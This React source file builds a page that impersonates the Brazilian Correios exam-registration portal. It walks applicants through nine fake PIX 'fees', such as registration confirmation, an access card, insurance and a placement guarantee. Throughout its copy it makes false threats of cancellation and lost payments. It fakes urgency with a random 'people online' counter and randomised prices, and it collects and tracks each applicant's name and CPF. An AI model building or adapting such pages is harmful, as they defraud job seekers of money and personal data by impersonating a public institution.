import { useEffect, useMemo, useState } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import { FileCheck, FileText, Shield, MapPin, CreditCard, Fingerprint, BookOpen, CheckSquare, Star } from "lucide-react";
import { Button } from "@/components/ui/button";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession, CepData, AgencyData } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

interface UpsellInfoItem {
  title: string;
  valor: number;
  icon: typeof MapPin;
  headline: string;
  explicacao: string;
  items: string[];
  consequencias: string[];
  nota: string;
  botaoTexto: string;
}

const buildUpsellInfo = (cepData?: CepData, agencyData?: AgencyData): UpsellInfoItem[] => {
  const agenciaNome = agencyData?.name
    || (cepData ? `Agência ${cepData.localidade} — ${cepData.bairro || 'Centro'}` : "Agência mais próxima do seu CEP");
  const agenciaEndereco = agencyData?.endereco
    || (cepData?.logradouro ? `${cepData.logradouro}, ${cepData.bairro}, ${cepData.localidade}/${cepData.uf}` : "Endereço será definido com base no seu CEP");

  return [
    {
      title: "Confirmação da Inscrição", valor: 47, icon: FileCheck,
      headline: "⚠️ ATENÇÃO: SUA INSCRIÇÃO SERÁ CANCELADA EM 24 HORAS",
      explicacao: "Sua inscrição está com status PENDENTE agora. Isso significa que seu nome NÃO APARECE na lista oficial de candidatos. Se você não confirmar AGORA, sua inscrição será CANCELADA AUTOMATICAMENTE em 24 horas e você VAI PERDER a vaga. O dinheiro que você já pagou NÃO será devolvido. A confirmação é OBRIGATÓRIA — sem ela, no dia da prova seu nome simplesmente NÃO vai estar lá e você será IMPEDIDO de entrar.",
      items: [
        "Status muda de PENDENTE para CONFIRMADA imediatamente",
        "Seu nome incluído na lista oficial de candidatos",
        "Número de protocolo definitivo gerado na hora",
        "Comprovante de inscrição enviado por e-mail",
        "Vaga GARANTIDA no concurso",
        "Confirmação válida em todo o território nacional",
      ],
      consequencias: [
        "Sua inscrição será CANCELADA AUTOMATICAMENTE em 24 horas",
        "Você VAI PERDER a vaga e TODO o dinheiro já investido",
        "NÃO haverá reembolso — o valor pago é PERDIDO",
        "Terá que refazer TODO o processo do ZERO no próximo concurso",
      ],
      nota: "⚠️ SEM A CONFIRMAÇÃO, SUA INSCRIÇÃO SERÁ CANCELADA E VOCÊ PERDE TUDO.",
      botaoTexto: "CONFIRMAR INSCRIÇÃO AGORA — NÃO PERDER MINHA VAGA",
    },
    {
      title: "Confirmação do Local da Prova", valor: 37, icon: MapPin,
      headline: "⚠️ CONFIRME SEU LOCAL DE PROVA AGORA OU SERÁ ENVIADO PRA QUALQUER LUGAR",
      explicacao: cepData
        ? `Com base no CEP ${cepData.cep} que você informou, o local de prova mais próximo da sua casa é a ${agenciaNome}, localizada em ${agenciaEndereco}. Se você NÃO confirmar AGORA, o sistema vai te jogar em QUALQUER local com vaga sobrando — pode ser a HORAS de distância da sua casa. Você vai ter que acordar de madrugada, gastar com transporte e chegar CANSADO na prova. Quem confirma o local AGORA garante a vaga no local mais perto.`
        : "O sistema distribui os candidatos de forma ALEATÓRIA nos locais de prova disponíveis. Se você NÃO confirmar agora, pode ser enviado para um local a HORAS de distância da sua casa. Confirme AGORA e garanta o local mais perto de você.",
      items: [
        cepData ? `✔ Local confirmado: ${agenciaNome}` : "Prova no local mais próximo de você",
        cepData ? `✔ Endereço: ${agenciaEndereco}` : "Endereço enviado por e-mail e SMS",
        "Sala com acessibilidade garantida",
        "Prioridade TOTAL na alocação — você escolhe, não o sistema",
        "Mapa com direções para o local da prova",
        "Opção de trocar o local até 48h antes da prova",
      ],
      consequencias: [
        "Você SERÁ ENVIADO para qualquer local com vaga sobrando",
        "Pode ter que viajar HORAS no dia da prova — acordar de madrugada",
        "NÃO terá direito a solicitar mudança de local depois",
        "Chegará CANSADO e NERVOSO na prova por causa da viagem",
      ],
      nota: "⚠️ QUEM NÃO CONFIRMA O LOCAL VAI PRA ONDE SOBRAR VAGA. NÃO TEM COMO RECLAMAR DEPOIS.",
      botaoTexto: "CONFIRMAR MEU LOCAL AGORA",
    },
    {
      title: "Cartão de Acesso à Prova", valor: 39, icon: CreditCard,
      headline: "🚫 SEM O CARTÃO VOCÊ NÃO ENTRA NA PROVA — PONTO FINAL",
      explicacao: "O Cartão de Acesso é o documento OBRIGATÓRIO para entrar no local de prova. Os fiscais NÃO vão deixar você entrar sem ele — NÃO IMPORTA se seu nome está na lista. Sem o cartão, você fica do lado de FORA assistindo os outros candidatos entrarem. Todo o dinheiro investido, todo o tempo estudando — JOGADO NO LIXO porque você não tinha o cartão.",
      items: [
        "Documento oficial com seu nome, foto e CPF",
        "Número da sala e horário exato da prova",
        "QR Code para entrada RÁPIDA sem fila",
        "Versão digital disponível no celular",
        "Local da prova com endereço completo",
        "Código de barras para conferência dos fiscais",
        "Válido como documento de identificação no local",
      ],
      consequencias: [
        "Você será IMPEDIDO DE ENTRAR no local da prova",
        "PERDERÁ a inscrição e TODOS os valores pagos",
        "NÃO haverá segunda chance — a prova acontece UMA ÚNICA VEZ",
        "Meses de estudo JOGADOS NO LIXO",
      ],
      nota: "🚫 SEM O CARTÃO = SEM PROVA. SEM PROVA = SEM VAGA. É SIMPLES ASSIM.",
      botaoTexto: "GARANTIR MEU CARTÃO DE ACESSO AGORA",
    },
    {
      title: "Seguro do Candidato", valor: 27, icon: Shield,
      headline: "⚠️ SE O CONCURSO FOR CANCELADO, VOCÊ PERDE TODO SEU DINHEIRO",
      explicacao: "Concursos são cancelados o tempo todo. Já aconteceu DEZENAS de vezes e milhares de candidatos PERDERAM TUDO que pagaram — sem direito a reembolso, sem recurso, sem nada. Se isso acontecer e você NÃO tiver o seguro, seu dinheiro VAI PRO LIXO. Com o seguro, você recebe 100% DE VOLTA em qualquer situação. É a única proteção que existe.",
      items: [
        "Reembolso de 100% se o concurso for cancelado",
        "Cobertura total se a prova for adiada",
        "Proteção contra erro ou falha no sistema",
        "Suporte jurídico GRATUITO pra reclamar seus direitos",
        "Cobertura para problemas no dia da prova",
        "Reembolso processado em até 7 dias úteis",
      ],
      consequencias: [
        "Se o concurso for cancelado, você PERDE TUDO — sem reembolso",
        "NÃO terá direito a nenhum valor de volta",
        "Ficará SEM suporte jurídico se houver irregularidades",
        "Vai ter que engolir o prejuízo calado",
      ],
      nota: "⚠️ SEM SEGURO = SEM PROTEÇÃO. SE CANCELAR, VOCÊ PERDE TUDO.",
      botaoTexto: "PROTEGER MEU INVESTIMENTO AGORA",
    },
    {
      title: "Apostila Digital Oficial", valor: 33, icon: BookOpen,
      headline: "📚 CANDIDATOS COM MATERIAL OFICIAL PASSAM 3X MAIS",
      explicacao: "Esta apostila foi elaborada com base no conteúdo EXATO do edital — as matérias que VÃO CAIR na prova. Enquanto você estuda às cegas, outros candidatos estão estudando EXATAMENTE o que vai ser cobrado. Candidatos que usam material oficial têm taxa de aprovação 3X MAIOR. Você vai competir com eles sem esse material?",
      items: [
        "Conteúdo completo de TODAS as matérias do edital",
        "Questões comentadas de provas anteriores da MESMA banca",
        "Resumos e mapas mentais para revisão rápida",
        "Acesso IMEDIATO após pagamento",
        "PDF — acesse no celular, tablet ou computador",
        "Atualizações automáticas se o edital mudar",
        "Gabaritos comentados passo a passo",
      ],
      consequencias: [
        "Vai estudar SEM SABER o que realmente cai na prova",
        "Risco ALTÍSSIMO de reprovar por falta de preparação",
        "Outros candidatos terão VANTAGEM ENORME sobre você",
        "Vai perder tempo estudando o que NÃO cai",
      ],
      nota: "📚 QUEM ESTUDA COM MATERIAL OFICIAL PASSA. QUEM NÃO ESTUDA, REPROVA.",
      botaoTexto: "BAIXAR APOSTILA OFICIAL AGORA",
    },
    {
      title: "Simulado Online da Banca", valor: 24, icon: FileText,
      headline: "🎯 FAÇA A PROVA ANTES DA PROVA — SIMULADO IDÊNTICO",
      explicacao: "Este simulado reproduz EXATAMENTE o formato, tempo e dificuldade da prova real. Quem faz simulado chega no dia da prova PREPARADO — sabe o formato, sabe administrar o tempo, sabe o que esperar. Quem NÃO faz, chega nervoso, perde tempo e REPROVA. Simples assim.",
      items: [
        "Mesmo tempo e formato da prova oficial",
        "Correção automática com gabarito comentado",
        "Ranking geral com outros candidatos",
        "Refaça QUANTAS VEZES quiser até o dia da prova",
        "Relatório de desempenho por matéria",
        "Identifica seus pontos fracos pra focar no estudo",
        "Cronômetro simulando a pressão real da prova",
      ],
      consequencias: [
        "Vai entrar na prova SEM SABER o formato das questões",
        "NÃO vai saber administrar o tempo — vai se desesperar",
        "Nervosismo e surpresa no dia = REPROVAÇÃO",
      ],
      nota: "🎯 QUEM FAZ SIMULADO, PASSA PREPARADO. QUEM NÃO FAZ, LEVA SUSTO.",
      botaoTexto: "FAZER SIMULADO AGORA",
    },
    {
      title: "Certificado de Pré-Aprovação", valor: 19, icon: Fingerprint,
      headline: "📄 PRECISA FALTAR NO TRABALHO? ESTE CERTIFICADO RESOLVE",
      explicacao: "O Certificado de Pré-Aprovação comprova que você é candidato oficial e está apto a fazer a prova. A maioria dos candidatos USA este certificado para justificar falta no trabalho — empresas ACEITAM como comprovante oficial. Sem ele, você pode levar FALTA, ter DESCONTO no salário ou até ADVERTÊNCIA.",
      items: [
        "Certificado com seus dados completos e protocolo",
        "ACEITO por empresas para justificar falta no trabalho",
        "Comprova que você é candidato oficial do concurso",
        "Válido em todo o território nacional",
        "Formato digital e impresso",
        "Número de registro único para verificação online",
      ],
      consequencias: [
        "NÃO terá documento para justificar falta no trabalho",
        "Pode ter DESCONTO no salário ou ADVERTÊNCIA por falta",
        "Não poderá comprovar que é candidato oficial",
      ],
      nota: "📄 SEM CERTIFICADO = FALTA INJUSTIFICADA NO TRABALHO.",
      botaoTexto: "GERAR MEU CERTIFICADO AGORA",
    },
    {
      title: "Acompanhamento por SMS e E-mail", valor: 15, icon: CheckSquare,
      headline: "📱 NÃO FIQUE POR FORA — RECEBA TODOS OS AVISOS",
      explicacao: "Concursos mudam datas, locais e regras SEM AVISO. Se você não ficar sabendo a tempo, pode ir pro local ERRADO ou perder um prazo IMPORTANTE. Já aconteceu com milhares de candidatos que PERDERAM a vaga por não saber de uma mudança. Com o acompanhamento, você recebe TUDO direto no celular — ANTES de todo mundo.",
      items: [
        "Alerta IMEDIATO de mudança de data ou local",
        "Gabarito oficial enviado no DIA da prova",
        "Resultado ANTES da publicação no site oficial",
        "Avisos importantes por SMS direto no celular",
        "Lembretes automáticos antes da prova",
        "Notificação de convocação para posse",
        "Atualizações sobre recursos e mudanças no edital",
      ],
      consequencias: [
        "Pode PERDER prazos importantes sem saber",
        "Risco de ir pro LOCAL ERRADO no dia da prova",
        "Vai descobrir o resultado DEPOIS de todo mundo",
        "Pode perder a CONVOCAÇÃO para posse sem saber",
      ],
      nota: "📱 QUEM NÃO SE CADASTRA, PERDE PRAZO E PERDE VAGA.",
      botaoTexto: "ATIVAR ALERTAS AGORA",
    },
    {
      title: "Garantia de Vaga na Região", valor: 97, icon: Star,
      headline: "🏆 ÚLTIMA ETAPA — GARANTA QUE VAI TRABALHAR PERTO DE CASA",
      explicacao: "Esta é a ÚLTIMA taxa do processo. Com ela, se você for aprovado, vai trabalhar na agência MAIS PERTO da sua casa. Sem essa garantia, o órgão pode te enviar para QUALQUER cidade do estado — a CENTENAS de quilômetros de onde você mora. Imagine passar no concurso e ter que se mudar pra uma cidade que você nem conhece. Com a garantia, você ESCOLHE onde trabalha.",
      items: [
        "Trabalhe na agência dos Correios MAIS PERTO de você",
        "Prioridade TOTAL na escolha da cidade de lotação",
        "Acompanhamento VIP de todo o processo até a posse",
        "Inscrição 100% CONCLUÍDA após este pagamento",
        "Suporte dedicado para dúvidas sobre o concurso",
        "Garantia registrada no sistema com número de protocolo",
        "Certificado de inscrição completa enviado por e-mail",
      ],
      consequencias: [
        "Pode ser enviado para QUALQUER cidade do estado — sem escolha",
        "NÃO terá prioridade na escolha do local de trabalho",
        "Sua inscrição ficará como INCOMPLETA no sistema",
        "Pode ter que se MUDAR para cidade desconhecida",
      ],
      nota: "🏆 ÚLTIMA TAXA. APÓS O PAGAMENTO, SUA INSCRIÇÃO ESTARÁ 100% CONCLUÍDA. NÃO DEIXE PRA DEPOIS.",
      botaoTexto: "FINALIZAR MINHA INSCRIÇÃO AGORA",
    },
  ];
};

const UpsellInfo = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 9);
  const currentIndex = stepNumber - 1;

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;
  const cepData: CepData | undefined = session?.cepData;
  const agencyData: AgencyData | undefined = session?.agencyData;

  const upsellInfo = useMemo(() => buildUpsellInfo(cepData, agencyData), [cepData, agencyData]);
  const info = upsellInfo[currentIndex];

  const valorComCentavos = info.valor + (Math.floor(Math.random() * 99) + 1) / 100;

  const [pessoasOnline] = useState(() => Math.floor(Math.random() * 30) + 15);

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell-info/${stepNumber}`, valorBeneficio, protocolo, cepData });
    trackFunnelEvent(`upsell-info-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePagar = () => {
    navigate(buildUrlWithUtm(`/upsell/${stepNumber}`), { state: { cpfData, valorBeneficio, protocolo } });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Inscrição > Taxas" />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-lg mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg">{info.headline}</h1>

          {/* Explicação detalhada */}
          <div className="rounded border-2 border-destructive/30 bg-muted/30 p-4 text-sm text-foreground leading-relaxed font-medium">
            {info.explicacao}
          </div>

          {/* Local da prova - dados do CEP (only on step 2) */}
          {stepNumber === 2 && (
            <table className="tabela-zebra">
              <thead><tr><th colSpan={2}>📍 Local de Prova Atribuído ao Seu CEP</th></tr></thead>
              <tbody>
                <tr><td className="font-semibold w-1/3">Agência</td><td className="font-bold">{agencyData?.name || (cepData ? `Agência ${cepData.localidade} — ${cepData.bairro || 'Centro'}` : 'Processando...')}</td></tr>
                <tr><td className="font-semibold">Endereço</td><td>{agencyData?.endereco || (cepData ? `${cepData.localidade}/${cepData.uf}` : 'Processando com base no seu CEP...')}</td></tr>
                {cepData && <tr><td className="font-semibold">CEP</td><td>{cepData.cep}</td></tr>}
                {agencyData?.distanceKm !== undefined && <tr><td className="font-semibold">Distância</td><td>{agencyData.distanceKm} km do CEP informado</td></tr>}
                <tr><td className="font-semibold">Status</td><td className="font-black text-destructive animate-pulse">⚠️ AGUARDANDO CONFIRMAÇÃO</td></tr>
              </tbody>
            </table>
          )}

          {/* Items table */}
          <table className="tabela-zebra">
            <thead>
              <tr><th>✅ O que está incluído nesta taxa</th></tr>
            </thead>
            <tbody>
              {info.items.map((item, i) => (
                <tr key={i}><td className="font-medium">✅ {item}</td></tr>
              ))}
            </tbody>
          </table>

          {/* Consequências */}
          <div className="rounded border-2 border-destructive bg-destructive/10 p-4 space-y-2">
            <p className="font-black text-destructive text-sm">🚨 O QUE ACONTECE SE VOCÊ NÃO PAGAR:</p>
            <ul className="space-y-1.5">
              {info.consequencias.map((c, i) => (
                <li key={i} className="text-sm text-destructive font-semibold flex items-start gap-2">
                  <span className="mt-0.5">❌</span>
                  <span>{c}</span>
                </li>
              ))}
            </ul>
          </div>

          {/* Candidato */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Dados do Candidato</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Candidato</td><td>{cpfData.nome}</td></tr>
              <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
            </tbody>
          </table>

          {/* Observação */}
          <div className="text-xs space-y-1 bg-destructive/10 border border-destructive rounded p-3">
            <p className="font-black text-destructive">🚨 ATENÇÃO — LEIA COM CUIDADO:</p>
            <p className="font-semibold text-destructive">• {info.nota}</p>
            <p className="text-muted-foreground">• Pagamento via PIX com confirmação instantânea.</p>
          </div>

          {/* Valor */}
          <div className="rounded border-2 border-destructive bg-destructive/10 p-4 text-center space-y-1">
            <p className="text-sm font-bold text-foreground">VALOR DA TAXA — PAGAMENTO ÚNICO</p>
            <p className="text-4xl font-black text-primary">
              R$ {valorComCentavos.toFixed(2).replace('.', ',')}
            </p>
          </div>

          {/* Pessoas online */}
          <div className="text-center text-xs font-bold text-destructive animate-pulse">
            🔴 {pessoasOnline} pessoas finalizando a inscrição agora
          </div>

          <Button onClick={handlePagar} className="w-full h-14 text-sm font-black tracking-wide">
            {info.botaoTexto}
          </Button>

          <p className="text-xs text-center text-destructive font-black">
            ⚠️ O NÃO PAGAMENTO DESTA TAXA RESULTARÁ NO CANCELAMENTO DA SUA INSCRIÇÃO. NÃO HÁ COMO REVERTER.
          </p>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default UpsellInfo;
